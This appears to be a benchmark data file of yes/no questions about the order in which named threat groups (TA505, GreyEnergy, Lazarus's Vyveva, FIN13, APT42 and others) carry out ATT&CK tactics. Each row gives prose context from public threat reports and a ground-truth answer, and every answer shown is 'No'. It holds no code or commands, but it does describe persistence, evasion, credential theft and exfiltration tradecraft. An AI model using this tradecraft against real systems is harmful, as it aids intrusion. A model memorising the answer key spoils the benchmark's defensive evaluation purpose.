Question ID,AttackSeq ID,Batch ID,Question,Key Points,Context,Ground Truth
123,25,25-Persistence-T1547-Boot or Logon Autostart Execution,"After the malicious macro executed from the MS Office documents and successfully downloaded the RMS tool and supporting scripts, is it likely that the threat actors will attempt to kill the 'rundll32.exe' process before achieving persistence by adding a 'Microtik' string value to the registry and launching the RMS executable?","Persistence: For persistence, the second-stage shell script added a 'Microtik' string value to the 'HKEY_CURRENT_USERS' hive, 'Windows\CurrentVersion\Run' key to launch the RMS executable whenever the user logged on. Additionally, the RMS executable was launched before the script tried to forcefully kill the 'rundll32.exe' process, causing the script to go into a loop.","Initial Access: CyberInt researchers have been tracking activities following a spear-phishing campaign targeting US-based retailers since December 2018. The campaign leveraged a legitimate remote administration tool, 'Remote Manipulator System' (RMS), developed by TektonIT, to gain entry into networks and evade security controls. The phishing emails contained malicious MS Office documents and used social engineering tactics.
Execution: The malicious MS Office documents delivered via phishing emails instructed victims to disable security controls to allow a nefarious macro to execute. This macro would then attempt to download malicious payloads from the threat actor's C2 infrastructure, which often masqueraded as legitimate-looking domains. The initial payload was typically a robust malware downloader used to gather further components, including the RMS tool, supporting shell scripts, and configuration files.
Defense Evasion: The threat actors utilized the RMS tool's capabilities to conduct reconnaissance and lateral movement within a victim network. The use of legitimate remote administration tools allowed threat actors to directly perform malicious activities as well as leverage the tool's capabilities to avoid detection.
Command and Control: The RMS executable attempted to 'call home' with connection attempts observed to a C2 server located in Germany. Additional malicious samples and associated C2 domains/IP addresses were linked to TA505 operations utilizing the 'ServHelper' backdoor.
Others: The sophisticated threat actor group dubbed 'TA505' has been active since 2014, conducting high-volume malicious email campaigns, including the distribution of banking trojans, botnets, exploit kits, and ransomware. TA505's recent campaigns have included the use of RMS in attacks against US-based retailers and the financial industry. Indicators of compromise identified in the US retail campaign were consistent with an attack against the Notary Chamber of Ukraine, also during December 2018. The accessibility and simplicity of using RMS for nefarious purposes likely explain the prevalence of the tool in unrelated malicious campaigns.",No
830,211,869-Defense Evasion-T1610-Deploy Container,"Before GreyEnergy employs stealth techniques like partial AES-256 encryption of modules for defense evasion, is it likely that they will deploy a container to execute a command to create a reverse shell on the node?","Defense Evasion: GreyEnergy employs stealth techniques, including pushing only selected modules to selected targets when needed, partial encryption of modules using AES-256, and running some modules fileless in memory to hinder analysis and detection.","Reconnaissance: ESET research has uncovered GreyEnergy, a successor to the BlackEnergy APT group, which has been targeting energy companies and other high-value targets in Ukraine and Poland for espionage and reconnaissance. GreyEnergy's activities include backdoor access, file extraction, taking screenshots, keylogging, password and credential stealing, and have been strategically targeting ICS control workstations running SCADA software and servers.
Resource Development: GreyEnergy's malware framework is modular, with functionality dependent on the combination of modules uploaded to targeted victim systems. The modules observed were used for espionage and reconnaissance purposes. GreyEnergy operators have been using a 'mini' backdoor deployed before admin rights are obtained and the full version is deployed. All remote C&C servers used by GreyEnergy were active Tor relays, an operational security technique to covertly connect to these servers.
Initial Access: GreyEnergy has used two distinct infection vectors: spearphishing and the compromise of public-facing web servers. When a vulnerable web server was hosted internally and connected to the rest of a targeted organization's network, the attacker would attempt to move laterally to other workstations. This technique is used not only as a primary infection vector but also as a backup reinfection vector.
Persistence: To cover their tracks, GreyEnergy's operators securely wipe the malware components from the victims' hard drives.
Credential Access: GreyEnergy operators use common external tools such as Mimikatz, PsExec, WinExe, Nmap, and a custom port scanner for credential access.
Lateral Movement: GreyEnergy attackers deploy internal C&C proxies within the victims' networks to redirect requests from infected nodes to an external C&C server on the internet. This stealth tactic makes it less suspicious as multiple computers are seen communicating with an internal server rather than a remote one.
Command and Control: GreyEnergy's internal C&C proxies redirect requests from infected nodes inside the network to an external C&C server on the internet, facilitating stealthy communication.
Others: GreyEnergy is linked to the BlackEnergy and TeleBots subgroups due to the appearance of GreyEnergy coinciding with the disappearance of BlackEnergy, shared interest in the energy sector and critical infrastructure, victims primarily in Ukraine and Poland, architectural similarities between the malware frameworks, and operational security techniques. GreyEnergy is considered a more modern toolkit with a greater focus on stealth compared to BlackEnergy. Some GreyEnergy samples were signed with a certificate from Advantech, indicating that these were most likely stolen, similar to Stuxnet and a recent Plead malware campaign. GreyEnergy also deployed an early version of the TeleBots' NotPetya worm, showing significant code reuse between this ransomware component and the GreyEnergy core module.",No
92,15,393-Collection-T1115-Clipboard Data,"After obtaining information such as the local IP address and system time through discovery, is Vyveva's backdoor likely to steal data from the victim's clipboard before compressing collected files and sending them to the C&C server?","Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",No
1395,337,337-Collection-T1074-Data Staged,"After collecting data from network shared drives and staging the data either locally or remotely for eventual fraudulent transactions, is FIN13 likely to leverage WMI to remotely execute commands and move laterally within victim networks?","Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",No
815,209,209-Command and Control-T1573-Encrypted Channel,"After communicating with C2 servers using an AES key encrypted with RSA as part of its command and control activities, is it likely that WinDealer will process and encrypt stolen data as "".a"" files in the %TEMP% directory during the exfiltration phase?","Command and Control: WinDealer communicates with C2 servers using UDP port 6999 or TCP port 55556. It encrypts an AES key with RSA and sends it to the C2 server, which then sends commands back to the victim PC. The malware executes these commands and sends the results back to the C2 server after encryption. It also communicates with non-existent domains and uses icanhazip[.]com for IP address verification.","Execution: The WinDealer malware, associated with the LuoYu Attack Group, executes upon launch by reading its configuration from a file located under C:\ProgramData. It then loads a DLL module into memory. The malware is designed to steal information from the victim's PC, including network configuration and details from SNS applications, and saves this data with a "".a"" extension in the %TEMP% directory. This information is subsequently sent to a C2 server.
Defense Evasion: WinDealer employs defense evasion by encoding its configuration files using XOR with the key value ""b6a7%7486"". It also communicates with C2 servers using encrypted channels, specifically encrypting an AES key with RSA and sending it to the C2 server. The malware further encrypts stolen information using AES128bit ECB mode before transmission.
Discovery: WinDealer discovers information about the infected PC and network configuration, as well as data from SNS applications. It processes and stages the stolen data in a folder under %TEMP%, encrypting it with AES before sending it to a C2 server.
Collection: The malware collects data from the victim's PC, including files stored on USB memory, documents, desktop items, and recycle bin contents. It also targets folders related to SNS applications. The collected data is processed into "".a"" files by a module and is categorized into different directories based on the data type.
Exfiltration: The malware exfiltrates stolen data to a C2 server after processing and encrypting it. The data is sent from the %TEMP% directory where it is staged as "".a"" files.
Others: The LuoYu Attack Group has been targeting Korean and Japanese organizations since 2014. The WinDealer malware is one of the tools used by this group, and it operates on various platforms. The malware has been observed to monitor and process data from USB memory, documents, desktop, recycle bin, and SNS application folders. The malware's configuration is stored in several folders under C:\ProgramData, and it uses a hardcoded RSA1024bit public key for encryption. The malware's communication with C2 servers includes sending an encrypted AES key and receiving commands. The malware's DLL module, named ""MozillaDll.dll"", has export functions for stealing data, setting configuration, and initiating commands. The malware also monitors items such as files stored in USB memory and folders related to SNS applications, saving related items in separate files to be sent to a C2 server.",No
1707,407,407-Defense Evasion-T1027-Obfuscated Files or Information,Is it likely that Black Energy 2 will allocate memory in the svchost.exe process and launch the injected library’s code using APC queue processing for persistence before evading defenses by encrypting its payload and loading plugins directly onto the infected machine?,"Defense Evasion: Black Energy 2 evades defenses by hiding its payload using encryption, code compression, and potentially anti-emulation techniques. The malware's plugins are not executable files and are loaded directly onto an infected machine, which means they may not be distributed using mass propagation techniques, making it harder for antivirus vendors to detect new plugins.","Execution: Cybercriminals use Black Energy 2, detected as Backdoor.Win32.Blakken by Kaspersky Lab, to execute malicious activities on infected computers. The malware hides its code from antivirus products using encryption and code compression, and it infects system processes. Upon execution, Black Energy 2 allocates virtual memory, copies its decryptor code, and passes control to the decryptor, which then places dropper functionality code in memory. A decryptor driver with a random name is created in the system32drivers directory, and a corresponding service is started. The driver acts as a wrapper for the malware's core components.
Persistence: Black Energy 2 maintains persistence by injecting a DLL into the svchost.exe user-mode process. The infector driver, which contains the malicious DLL, locates the svchost.exe process, allocates memory in its address space, and launches the injected library's code using APC queue processing.
Command and Control: The botnet's command-and-control (C&C) center communicates with Black Energy 2 through HTTP requests. The bot sends a preformed HTTP request containing data that identifies the infected machine. The C&C responds with a bot configuration file, which is an encrypted XML document. The bot can receive general commands from the C&C, such as downloading and executing files, updating the bot, and setting contact frequency with the C&C server.
Impact: Black Energy 2 is primarily used to conduct DDoS attacks. It uses plugins like ddos, syn, and http to initiate mass connections and send random data packets to target servers. The malware can create a significant load on servers, especially when using the http plugin, which imitates an ordinary user visiting a page multiple times in a short period.
Others: Kaspersky Lab has identified over 4,000 modifications of Black Energy 2 since mid-2008. The malware has evolved to include plugins that extend its capabilities beyond DDoS attacks, potentially allowing for spam distribution, credential grabbing, and proxy server setup. Kaspersky Lab continues to monitor the evolution of Black Energy 2 and its plugins to track the threat's progression.",No
353,88,88-Command and Control-T1132-Data Encoding,"After the downloader retrieves an image file containing encoded Asruex malware during the command and control phase, is it likely that PowerShell scripts will then download a Windows executable and a decoy document during the execution phase?","Command and Control: The downloader retrieves an image file containing encoded Asruex malware, which is then decoded and executed. Asruex communicates with a C&C server over HTTP and executes commands received. It operates based on configuration information stored within, including C&C servers, dummy hosts, version information, and a key for decoding data.","Initial Access: JPCERT/CC has been tracking malicious shortcut files sent as email attachments targeting specific organizations since around October 2015. These shortcut files, when opened, infect the host with Asruex malware, which has remote control capabilities. The attackers, associated with the group 'DarkHotel', use this method to attempt network intrusion.
Execution: Upon opening the malicious shortcut file, a PowerShell command is executed to download a batch file from a URL, which then executes PowerShell scripts to download a Windows executable (downloader) and a decoy document. The decoy documents are in Japanese and Chinese, indicating a broader target range.
Defense Evasion: Asruex malware has anti-analysis features, including the ability to detect virtual machines and stop running if such an environment is detected. It also has the capability to detect anti-virus software.
Others: Asruex is a relatively new malware observed since October 2015, likely to be used in continued targeted attacks. The malware downloads and executes AdvProv.dll, a plug-in that expands Asruex's functions, including file manipulation and registry operations. Hash values of artifacts and destination URLs used by Asruex are provided for security measures.",No
83,15,15-Exfiltration-T1041-Exfiltration Over C2 Channel,"After exfiltrating data to its C&C server over the communication channel via Tor as part of the Exfiltration tactic, is it likely that Vyveva will compress files with zlib for collection during the Collection tactic?",Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).,"Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",No
1606,381,2248-Credential Access-T1056-Input Capture,"After gaining initial access through malicious LNK files and delivering payloads via a convoluted infection chain, is SideCopy likely to capture mouse movements or perform API hooking before deploying njRAT malware for credential harvesting?","Credential Access: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.","Reconnaissance: Cisco Talos has observed SideCopy APT's activities targeting government personnel in India, using tactics and themes similar to APT36, which includes using decoys posing as operational documents belonging to the military and think tanks, and honeytrap-based infections. SideCopy campaigns use themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content. SideCopy has shown a particular interest in Kavach, an MFA app used across India's government, deploying njRAT malware with special victim IDs of 'kavach' and using GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Resource Development: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.
Initial Access: SideCopy's infection chains have remained relatively consistent with minor variations, using malicious LNK files as entry points, followed by a convoluted infection chain involving multiple HTAs and loader DLLs to deliver the final payloads. They have also used self-extracting RAR-based dropper executables and MSI-based installers as part of their infection techniques.
Execution: SideCopy deploys a variety of RATs and plugins post-infection, including file enumerators, credential-stealers, and keyloggers. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Persistence: SideCopy uses various techniques to maintain persistence on infected systems, including the use of malicious LNK files, HTAs, loader DLLs, and MSI-based installers. They also use registry keys for persistence and have been observed using VBScripts to persist MargulasRAT via the registry.
Defense Evasion: SideCopy employs tactics to avoid detection, such as using decoy documents and images, and mimicking legitimate processes. They also use cloned websites to serve malicious content and have shown a particular interest in evading detection by targeting Kavach, an MFA app used by the Government of India.
Discovery: SideCopy uses themes predominantly designed to target military personnel in the Indian subcontinent, with many LNK files and decoy documents posing as internal, operational documents of the Indian Army. They also use honeytraps to lure victims in, displaying explicit photos of women, and clone legitimate websites to serve malicious content.
Collection: SideCopy utilizes modular plugins to carry out specific malicious tasks on the infected endpoint, such as file enumeration, browser password stealing, and keylogging. They have developed multiple new RAT families and plugins currently used in SideCopy infection chains.
Command and Control: SideCopy's delivery infrastructure consists of either setting up fake websites or using compromised websites to deliver malicious artifacts to specific victims. The delivery scripts verify that requests to receive artifacts/payloads are from two specific geographies: India and Pakistan. All requests are logged to a log file on the delivery server to keep track of artifacts served to potential victims.
Exfiltration: SideCopy's central motive is credential harvesting, specifically targeting access credentials from central Indian government employees. They commonly target Kavach, an MFA app used across India's government, and have deployed njRAT malware with special victim IDs of 'kavach.' They also use GoLang-based file recon plugins to exfiltrate Kavach authentication databases from infected devices.
Others: SideCopy APT group mimics the Sidewinder APT's infection chains to deliver their own set of malware. They have used a variety of post-infection plugins specifically for espionage, indicating a focus on credential harvesting, particularly targeting Kavach, an MFA app used by the Government of India. SideCopy also uses phishing portals posing as the Government of India's webmail to trick victims into divulging their email credentials.",No
9,3,3-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After APT42 performs credential harvesting through social engineering efforts, is it likely they will conduct reconnaissance to identify targets through spear-phishing and surveillance operations only after utilizing virtualization or sandbox evasion techniques for defense evasion?","Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.","Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.
Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.
Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.
Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",No
